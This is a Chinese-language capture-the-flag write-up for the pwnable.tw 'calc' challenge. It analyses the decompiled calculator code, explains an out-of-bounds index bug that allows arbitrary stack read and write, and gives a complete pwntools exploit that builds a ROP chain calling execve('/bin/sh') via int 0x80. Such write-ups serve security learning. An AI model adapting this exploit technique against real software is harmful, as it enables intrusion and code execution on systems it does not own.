# Pwnable.tw calc

### 0x1 分析

看一下安全性：

```shell
[*] './calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

地址固定。

另外是静态链接。

```shell
➜  calc ldd calc
	not a dynamic executable
```

这就是个计算器程序，从`main()`函数开始看：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, timeout);
  alarm(60);
  puts("=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts("Merry Christmas!");
}
```

只是一个定时，主要的功能在`calc()`：

```c
unsigned int calc()
{
  int cnt; // [esp+18h] [ebp-5A0h]
  int num[100]; // [esp+1Ch] [ebp-59Ch]
  char expr; // [esp+1ACh] [ebp-40Ch]
  unsigned int v4; // [esp+5ACh] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(&expr, 0x400u);
    if ( !get_expr((int)&expr, 0x400) )
      break;
    init_pool(&cnt);                            // set 0 into num[]
    if ( parse_expr((int)&expr, &cnt) )
    {
      printf((const char *)&unk_80BF804, num[cnt - 1]);// printf("%d\n", num[cnt - 1]);
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v4;
}
```

大致逻辑是: 

`bzero()`清空`expr` -> `get_expr()`过滤表达式存入`expr` -> `init_pool()`清空`num` -> `parse_expr()`来算数。

大致看一眼`get_expr()`:

```c
int __cdecl get_expr(int expr, int len)
{
  int v2; // eax
  char buf; // [esp+1Bh] [ebp-Dh]
  int cnt; // [esp+1Ch] [ebp-Ch]

  cnt = 0;
  while ( cnt < len && read(0, &buf, 1) != -1 && buf != '\n' )
  {
    if ( buf == '+' || buf == '-' || buf == '*' || buf == '/' || buf == '%' || buf > '/' && buf <= '9' )
    {
      v2 = cnt++;
      *(_BYTE *)(expr + v2) = buf;
    }
  }
  *(_BYTE *)(cnt + expr) = 0;
  return cnt;
}
```

过滤表达式，最后加上`\0`。

然后是清空`num[]`，并把`cnt`置零。

```c
_DWORD *__cdecl init_pool(_DWORD *a1)
{
  _DWORD *result; // eax
  signed int i; // [esp+Ch] [ebp-4h]

  result = a1;
  *a1 = 0;
  for ( i = 0; i <= 99; ++i )
  {
    result = a1;
    a1[i + 1] = 0;
  }
  return result;
}
```

然后是计算了：

`parse_expr()`

```c
signed int __cdecl parse_expr(int expr, _DWORD *cnt)
{
  int num_len; // ST2C_4
  int v4; // eax
  int pre_ptr; // [esp+20h] [ebp-88h]
  int i; // [esp+24h] [ebp-84h]
  int v7; // [esp+28h] [ebp-80h]
  char *s1; // [esp+30h] [ebp-78h]
  int num; // [esp+34h] [ebp-74h]
  char s[100]; // [esp+38h] [ebp-70h]
  unsigned int v11; // [esp+9Ch] [ebp-Ch]

  v11 = __readgsdword(0x14u);
  pre_ptr = expr;
  v7 = 0;
  bzero(s, 100u);
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)(*(char *)(i + expr) - 48) > 9 )// find a +-*/%
    {
      num_len = i + expr - pre_ptr;
      s1 = (char *)malloc(num_len + 1);
      memcpy(s1, pre_ptr, num_len);
      s1[num_len] = 0;
      if ( !strcmp(s1, "0") )
      {
        puts("prevent division by zero");
        fflush(stdout);
        return 0;
      }
      num = atoi((int)s1);
      if ( num > 0 )
      {
        v4 = (*cnt)++;
        cnt[v4 + 1] = num;
      }
      if ( *(_BYTE *)(i + expr) && (unsigned int)(*(char *)(i + 1 + expr) - 48) > 9 )
      {
        puts("expression error!");
        fflush(stdout);
        return 0;
      }
      pre_ptr = i + 1 + expr;
      if ( s[v7] )
      {
        switch ( *(char *)(i + expr) )
        {
          case '%':
          case '*':
          case '/':
            if ( s[v7] != '+' && s[v7] != '-' )
            {
              eval(cnt, s[v7]);
              s[v7] = *(_BYTE *)(i + expr);
            }
            else
            {
              s[++v7] = *(_BYTE *)(i + expr);
            }
            break;
          case '+':
          case '-':
            eval(cnt, s[v7]);
            s[v7] = *(_BYTE *)(i + expr);
            break;
          default:
            eval(cnt, s[v7--]);
            break;
        }
      }
      else
      {
        s[v7] = *(_BYTE *)(i + expr);
      }
      if ( !*(_BYTE *)(i + expr) )
        break;
    }
  }
  while ( v7 >= 0 )
    eval(cnt, s[v7--]);
  return 1;
}
```

每次遇到一个算数符号，就检查是否满足运算，把数存到`num[]`里，在`cnt`里计数有几个数。

如果满足运算就进入`eval()`参与运算。

`eval()`

```c
_DWORD *__cdecl eval(_DWORD *a1, char a2)
{
  _DWORD *result; // eax

  if ( a2 == '+' )
  {
    a1[*a1 - 1] += a1[*a1];
  }
  else if ( a2 > '+' )
  {
    if ( a2 == '-' )
    {
      a1[*a1 - 1] -= a1[*a1];
    }
    else if ( a2 == '/' )
    {
      a1[*a1 - 1] /= a1[*a1];
    }
  }
  else if ( a2 == '*' )
  {
    a1[*a1 - 1] *= a1[*a1];
  }
  result = a1;
  --*a1;
  return result;
}
```

这里直接在`num[]`里开始运算，并把结果存在第一个算数的位置。

#### 漏洞：

漏洞主要在于算数时，只是过滤了除了运算字符之外的字符，没有考虑算式的合法性，

比如`+100`这个算式就可以运行，由于越界，`cnt`作为第一个数字参与运算。而且，`cnt`是数组下标，通过不合法算式可以修改`cnt`来修改和泄漏任意位置的值。

#### 利用：

由于是静态链接，我们没办法使用re2libc来拿到shell。

但是可以通过构造栈，系统调用`int 0x80`来拿到shell。

大致的栈空间做成这样：

```
EBP													calc
-----------------------------------
RET													main
POP EAX; RET
0xb
POP ECX; POP EBX; RET
0
addr(sh) -
int 0x80  |
/bin			|
/sh\x00 <-
[···]
EBP
```

修改EIP(RET)指向`POP EAX; RET`。

即可拿到shell

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'i386' , os = 'linux', log_level='debug')

p=remote('chall.pwnable.tw',10100)
# p = process('./calc')

stacks=[0x0805c34b, 0xb, 0x080701d1, 0, 0, 0x08049a21, u32('/bin'), u32('/sh\0')]

# get esp
p.sendlineafter('=== Welcome to SECPROG calculator ===\n', '+'+str(360))
ebp_addr = int(p.recv())
rsp_addr =((ebp_addr + 0x100000000) & 0xFFFFFFF0) - 0x10
sh_addr = rsp_addr + 20 - 0x100000000

# update stacks 
stacks[4] = sh_addr

# change stacks
for i in range(8):
  p.sendline('+' + str(361 + i))
  payload = eval(p.recvline().strip('\n'))
  if stacks[i] < payload:
      payload = payload - stacks[i]
      p.sendline('+' + str(361 + i) + '-' + str(payload))
  else:
      payload = stacks[i] - payload
      p.sendline('+' + str(361 + i) + '+' + str(payload))
  p.recvline()

# get shell
p.sendline('a')
p.interactive()
```



 

